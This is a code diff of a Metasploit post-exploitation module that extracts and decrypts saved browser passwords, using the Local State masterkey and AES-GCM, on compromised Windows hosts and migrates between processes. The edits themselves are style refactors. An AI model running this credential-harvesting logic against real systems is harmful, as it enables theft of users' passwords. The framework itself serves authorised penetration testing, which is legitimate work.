@@ -196,7 +196,7 @@ class MetasploitModule < Msf::Post
               print_status('Found password encrypted with masterkey')
               local_state_path = @profiles_path + '\\' + username + @data_path + 'Local State'
               masterkey_encrypted = get_master_key(local_state_path)
-              masterkey = decrypt_data(masterkey_encrypted[5..-1])
+              masterkey = decrypt_data(masterkey_encrypted[5..])
               print_good('Found masterkey!')
             end
 
@@ -205,12 +205,12 @@ class MetasploitModule < Msf::Post
             cipher.key = masterkey
             cipher.iv = enc_data[3..14]
             ciphertext = enc_data[15..-17]
-            cipher.auth_tag = enc_data[-16..-1]
+            cipher.auth_tag = enc_data[-16..]
             pass = res[field + '_decrypted'] = cipher.update(ciphertext) + cipher.final
           else
             pass = res[field + '_decrypted'] = decrypt_data(enc_data)
           end
-          next unless !pass.nil? and pass != ''
+          next unless !pass.nil? && (pass != '')
 
           decrypt_table << [name, pass, origin]
           secret = "url:#{origin} #{name}:#{pass}"
@@ -281,7 +281,7 @@ class MetasploitModule < Msf::Post
 
   def migrate(pid = nil)
     current_pid = session.sys.process.open.pid
-    if !pid.nil? and current_pid != pid
+    if !pid.nil? && (current_pid != pid)
       # PID is specified
       target_pid = pid
       print_status("current PID is #{current_pid}. Migrating to pid #{target_pid}")
@@ -377,7 +377,7 @@ class MetasploitModule < Msf::Post
     usernames.each do |u|
       print_status("Extracting data for user '#{u}'...")
       success = extract_data(u)
-      process_files(u) if success and has_sqlite3
+      process_files(u) if success && has_sqlite3
     end
 
     # Migrate back to the original process
